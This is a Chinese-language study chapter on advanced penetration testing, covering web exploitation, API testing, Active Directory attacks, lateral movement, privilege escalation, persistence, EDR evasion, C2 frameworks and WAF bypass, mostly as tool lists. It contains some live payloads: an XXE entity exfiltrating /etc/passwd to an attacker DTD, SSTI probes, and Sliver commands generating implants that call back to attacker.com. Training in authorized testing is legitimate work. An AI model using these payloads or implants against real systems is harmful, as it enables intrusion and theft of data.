# 进阶

> 渗透测试进阶 = **Web 进阶(认证绕过/逻辑漏洞/反序列化/SSTI/XXE) + API 安全测试(OWASP API Top 10) + 移动 + 桌面 + AD 域渗透(Kerberoasting/AS-REP) + 内网横向(PtH/PtT/Relay) + 提权(Linux/Win) + 持久化 + 免杀基础 + Cobalt Strike + Sliver 进阶 + 主机加固对抗 + WAF Bypass + 自动化(BBOT/Nuclei 定制)**。本章面向独立完成中型授权渗透的工程师。

## 一、Web 进阶漏洞

### 1.1 认证 + 会话

```
缺陷:
  - 弱密码 + 无锁
  - JWT 弱密钥 / none algorithm
  - Session Fixation
  - Cookie 无 HttpOnly / Secure
  - 找回密码 token 可猜
  - OAuth state 缺失 (CSRF)
  
工具:
  Burp Repeater + Authorize 插件
  JWT Tool (jwt_tool.py)
  CO2 (Burp 插件)
```

### 1.2 越权 (IDOR / 横向 / 纵向)

```
横向: 改 user_id=1 → user_id=2 数据
纵向: role=user 改 role=admin

检测:
  Burp Authorize 自动多账号
  AuthMatrix (Burp 插件)
  自写脚本

防御:
  服务端鉴权 (不信 JWT 字段)
  ABAC / OPA / ReBAC
```

### 1.3 反序列化

```
PHP unserialize:
  POP 链 + gadget
  
Java:
  ysoserial ⭐ (CommonsCollections / Spring / ROME / FastJSON)
  fastjson 1.2.x autoType
  Log4j JNDI (CVE-2021-44228) ⭐
  
Python:
  pickle.loads
  yaml.load (without safe)
  
.NET:
  ysoserial.net

工具:
  ysoserial ⭐
  marshalsec
  ysoserial.net
```

### 1.4 SSTI (Server-Side Template Injection)

```
Jinja2 (Python):
  {{7*7}} → 49
  {{config.items()}}
  {{''.__class__.__mro__[1].__subclasses__()}}

Twig / Smarty (PHP)
Velocity / Freemarker (Java)
ERB (Ruby)

工具:
  tplmap
  Burp 插件
```

### 1.5 XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

# OOB (外带)
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://attacker/evil.dtd">
%dtd;

防御:
  禁外部实体 (libxml_disable_entity_loader)
  用 JSON 替代 XML
```

### 1.6 业务逻辑

```
- 价格篡改 (-1 / 0)
- 数量溢出
- 优惠券复用
- 验证码绕过 (前端校验 / 重放)
- 限流绕过 (X-Forwarded-For)
- 短信轰炸
- 充值漏洞
- 接口未鉴权
- 注册无验证

工具:
  Burp + 业务理解
  手工为主
```

## 二、API 安全测试

```
OWASP API Top 10 (2023):
  API1: BOLA (Broken Object Level Authorization) ⭐ 最多
  API2: Broken Authentication
  API3: BOPLA (Object Property Level)
  API4: Resource & Rate Limiting
  API5: Broken Function Level Authorization
  API6: Server-Side Request Forgery
  API7: Security Misconfiguration
  API8: Injection
  API9: Improper Inventory
  API10: Unsafe Consumption of APIs

测试:
  OpenAPI / Swagger 找接口
  Postman / Insomnia 重放
  Burp + Autorize
  Akto / Astra (API 专用扫描)
  
GraphQL:
  introspection 查询 schema
  Batched 攻击
  InQL (Burp 插件)
  
gRPC:
  grpcurl + reflection
  
工具:
  jwt_tool
  arjun (参数 fuzz)
  paramspider
```

## 三、AD 域渗透

```
枚举:
  BloodHound + SharpHound ⭐
  PowerView
  ldapsearch / ldapdomaindump
  enum4linux-ng
  CrackMapExec smb / ldap

攻击:
  Kerberoasting        请求 SPN, 离线破 hash
  AS-REP Roasting     无预认证用户
  LLMNR / NBT-NS Poison Responder ⭐
  NTLM Relay           ntlmrelayx
  Pass the Hash (PtH) hash 即密码
  Pass the Ticket (PtT) Kerberos
  Golden Ticket       krbtgt hash → 任意用户
  Silver Ticket       服务密钥
  DCSync              复制 NTDS
  DCShadow            假 DC
  Zerologon (CVE-2020-1472)
  PrintNightmare (CVE-2021-34527)
  PetitPotam → NTLM Relay → ADCS

工具:
  Impacket ⭐ (Python 套件)
    - secretsdump
    - GetUserSPNs
    - GetNPUsers
    - psexec / wmiexec / smbexec
    - ntlmrelayx ⭐
  Rubeus (C#, Kerberos)
  Mimikatz ⭐
  Certipy (ADCS)

防御:
  ☐ 禁 LLMNR / NBT-NS
  ☐ SMB 签名强制
  ☐ LAPS (本地管理员密码自动轮换)
  ☐ Tier 0/1/2 隔离
  ☐ Protected Users 组
  ☐ 删 NetBIOS
  ☐ 禁 NTLM (Kerberos only)
  ☐ ADCS 加固
```

## 四、内网横向

```
信息收集 (Linux):
  ./LinPEAS.sh
  arp / ip neigh
  /etc/hosts
  netstat / ss
  ps / crontab
  sudo -l
  history / .bash_history
  /etc/passwd | shadow
  find / -perm -u=s -type f 2>/dev/null  # SUID

信息收集 (Windows):
  WinPEAS.exe
  net user / net group
  arp -a
  ipconfig / route
  systeminfo
  tasklist / netstat
  whoami /all /groups /priv

横向:
  SSH (Linux): key / 密码复用
  WinRM (Win)
  PsExec / WMI
  SMB / NTLM Relay
  DCOM
  Kerberos (PtT)
  Mimikatz + PtH

Pivoting:
  ssh -D 1080 user@jump      # SOCKS
  ssh -L 8080:internal:80 user@jump
  chisel server / client
  ligolo-ng ⭐ (现代 + TUN)
  proxychains-ng
  Metasploit autoroute / socks
```

## 五、提权 (Privilege Escalation)

### 5.1 Linux

```bash
# 自动
./LinPEAS.sh
linenum.sh
lse.sh

# 手工
sudo -l                              # sudo 列表
find / -perm -u=s -type f 2>/dev/null # SUID
find / -writable 2>/dev/null         # 可写
crontab -l / cat /etc/crontab        # cron
cat /etc/passwd                       # 用户
cat /etc/shadow                       # hash (需 root)
uname -a + searchsploit              # 内核
mount                                 # 找挂载点

# 利用
SUID 二进制 (GTFOBins.github.io) ⭐
sudo NOPASSWD
cron 可写脚本
LD_PRELOAD
内核 (DirtyPipe / DirtyCow / OverlayFS)
docker.sock 暴露
```

### 5.2 Windows

```powershell
# 自动
WinPEAS.exe
PowerUp.ps1
Sherlock.ps1

# 手工
whoami /priv
whoami /groups
net localgroup administrators
systeminfo
wmic qfe                              # 补丁列表
sc query / sc qc <service>          # 服务

# 利用
未引号路径 (Unquoted Service Path)
AlwaysInstallElevated
ImpersonatePrivilege (SeImpersonate) → JuicyPotato / PrintSpoofer / GodPotato
DLL Hijack
内核漏洞 (Watson 找)
```

## 六、持久化

```
Linux:
  /etc/cron.d / cron jobs
  systemd 服务
  ~/.bashrc / ~/.profile
  authorized_keys
  LD_PRELOAD (rootkit)
  Kernel module

Windows:
  Run Key (HKCU/HKLM)
  Scheduled Task
  Service
  WMI Event
  Startup folder
  Golden Ticket (AD)
  DSRM password

红队对抗:
  混淆 + 多备份 + 异步触发
  
蓝队检测:
  Sysmon + ETW
  Velociraptor
  SOC + EDR
```

## 七、免杀基础

```
技术:
  - 加载器混淆 (PE/PowerShell 编码)
  - shellcode 加密 + 运行时解密
  - sleep + jitter
  - 反沙箱 (vbox / vmware 检测)
  - 反调试
  - 进程注入 (CreateRemoteThread / Process Hollowing / APC / EarlyBird)
  - syscall 直接调 (绕 EDR hook)
  - BYOVD (自带漏洞驱动)

工具:
  Donut (shellcode 转换)
  Nimcrypt2 / Freeze
  Ekko / Phantom (sleep masking)
  Hells Gate / Halo Gate (syscall)
  Cobalt Strike Malleable C2

合法应用:
  授权红队 / 蓝队对抗演练
  EDR 测试 (评估 Falcon / 360 / 阿里盾)
  
法律警示:
  非授权 = 制造传播恶意代码罪 (刑法)
```

## 八、C2 进阶

### 8.1 Cobalt Strike

```
功能:
  - Beacon (HTTP / DNS / SMB)
  - Malleable Profile (流量伪装)
  - 团队协作 (Teamserver)
  - PSExec / WMI 横向
  - Mimikatz 集成
  - 报告

替代:
  Sliver (开源 + 现代) ⭐
  Mythic (现代 + 模块化)
  Havoc (新)
  Brute Ratel (商业)

国产:
  Viper (开源)
  Goby (扫描+利用)
  红队同学魔改 CS 居多
```

### 8.2 Sliver

```bash
# Server
sliver-server

# 生成 implant
sliver > generate --mtls 1.2.3.4 --save .
sliver > generate --http http://attacker.com --save .
sliver > generate beacon --http http://attacker.com --interval 60s

# 监听
sliver > mtls --lport 8888
sliver > http --lport 80

# 交互
sliver > sessions
sliver > use <session>
[session] > shell / execute / netstat / portfwd / socks5

特点:
  开源 + Go (跨平台)
  mTLS / HTTP(S) / DNS / WireGuard
  Beacon / Session
  支持 BOF
```

## 九、WAF Bypass

```
常见 WAF:
  ModSecurity + OWASP CRS
  Cloudflare
  阿里云 WAF
  雷池 (国产现代)
  腾讯 T-Sec

绕过技术:
  - 大小写混合
  - 编码 (URL / Unicode / HTML / Base64)
  - 注释 (/* */ / -- / #)
  - 通配符 (LIKE)
  - 内联 (/*!50000*/)
  - 分块 (Transfer-Encoding)
  - HTTP 走私 (Smuggling)
  - 参数污染 (HPP)
  - 大包绕过
  - 同义函数 (SUBSTRING → MID)
  - 改 Header (X-Forwarded-For 绕 IP 限)

工具:
  wafw00f (识别)
  Burp + Bypass WAF (插件)
  自写 fuzz 字典
  nuclei templates
```

## 十、CVE 利用 + 复现

```
近年高频 CVE:
  Log4Shell (CVE-2021-44228) ⭐
  Spring4Shell (CVE-2022-22965)
  Confluence (CVE-2022-26134)
  GitLab (CVE-2021-22205)
  Microsoft Exchange (ProxyShell/Logon)
  VMware vCenter (Log4j / 反序列化)
  Citrix NetScaler (CVE-2023-3519)
  MOVEit (CVE-2023-34362)
  Ivanti Connect Secure (CVE-2024-21887)
  XZ Utils 后门 (CVE-2024-3094)

复现流程:
  1. 读 CVE + 厂商通告
  2. 找 POC (Github / nuclei-templates)
  3. 搭环境 (Docker / 漏洞集成镜像)
  4. 复现 + 抓包
  5. 撰写 nuclei template
  6. 防御 (Patch / WAF rule)

工具:
  nuclei + nuclei-templates ⭐
  searchsploit
  vulhub (漏洞集成 Docker) ⭐
  exploitdb
```

## 十一、自动化 + Recon Pipeline

```
工具链:
  amass + subfinder + assetfinder → 子域
  dnsx → 解析
  httpx → 存活
  nuclei → 漏洞
  ffuf → 目录
  gau / waybackurls → 历史 URL
  arjun → 参数
  gobuster / dirsearch → 目录爆破
  
BBOT ⭐ (自动化框架, Black Lantern):
  bbot -t example.com -f subdomain-enum -m httpx,nuclei

ProjectDiscovery 全家桶:
  amass + subfinder + nuclei + httpx + chaos + dnsx + tlsx + cdncheck

shennina / reNgine (Web 平台):
  自动 recon + 报告
  
SRC 实战:
  自动 + 人工 = 大量子域 + 接口 + 漏洞
  Bug Bounty 平台: HackerOne / Bugcrowd / Synack / 补天 / 漏洞盒子
```

## 十二、Checklist（进阶）

```
Web:
☐ 认证 + 会话 + JWT
☐ IDOR + 越权
☐ 反序列化 (PHP/Java/Python)
☐ SSTI + XXE
☐ 业务逻辑

API:
☐ OWASP API Top 10
☐ GraphQL + gRPC
☐ Burp Autorize

AD:
☐ BloodHound + SharpHound
☐ Kerberoasting + AS-REP
☐ Responder + ntlmrelayx
☐ PtH / PtT / Golden Ticket
☐ DCSync
☐ Impacket + Rubeus + Mimikatz + Certipy

内网:
☐ LinPEAS / WinPEAS
☐ ligolo-ng / chisel
☐ proxychains
☐ pivoting

提权:
☐ GTFOBins (Linux)
☐ JuicyPotato / PrintSpoofer (Win)
☐ 内核 + Service 漏洞

持久化:
☐ 多机制 + 异步 + 隐藏

C2:
☐ Sliver / Cobalt Strike / Mythic
☐ Malleable Profile
☐ BOF 编写

免杀:
☐ Donut + syscall + sleep
☐ EDR 测试

WAF Bypass:
☐ 编码 + 内联 + Smuggling
☐ 同义 + 大小写 + 参数污染

CVE:
☐ Log4j / Spring / Confluence / vCenter
☐ vulhub 复现
☐ nuclei template

自动化:
☐ BBOT / ProjectDiscovery 全家桶
☐ Bug Bounty 实战
```

## 十三、推荐栈（进阶）

```
Web:        Burp Pro ⭐ + nuclei + sqlmap + ffuf + jwt_tool + Autorize
API:        Postman + Burp Autorize + Akto + arjun
AD:         BloodHound ⭐ + Impacket ⭐ + Rubeus + Mimikatz + Certipy + Responder
内网:        ligolo-ng ⭐ + chisel + proxychains
提权:        LinPEAS + WinPEAS + GTFOBins + PEAS-ng
持久化:     Sliver Beacon + 多机制
C2:         Sliver ⭐ + Cobalt Strike (商业) + Mythic
免杀:        Donut + Nimcrypt2 + Hells Gate
WAF:        手工 + Burp + 自写字典
CVE:        nuclei + vulhub + exploitdb
自动化:     BBOT + ProjectDiscovery 全家桶
报告:        Markdown + PlexTrac + 自写 Jinja2
SRC:        HackerOne + 补天 + 漏洞盒子
```

> 📖 **核心判断**：渗透测试进阶 = **Web 进阶(认证/IDOR/反序列化/SSTI/XXE/逻辑) + API(OWASP Top 10/GraphQL/gRPC) + AD(BloodHound/Kerberoasting/Relay/PtH/Golden Ticket) + 内网横向(ligolo/chisel/PEAS) + 提权(GTFOBins/Potato) + 持久化 + 免杀 + C2(Sliver/CS) + WAF Bypass + CVE 复现(vulhub/nuclei) + BBOT 自动化**。能独立完成"中型企业 web+ad+内网+横向+提权+报告"完整链路，就具备进阶渗透工程师能力。
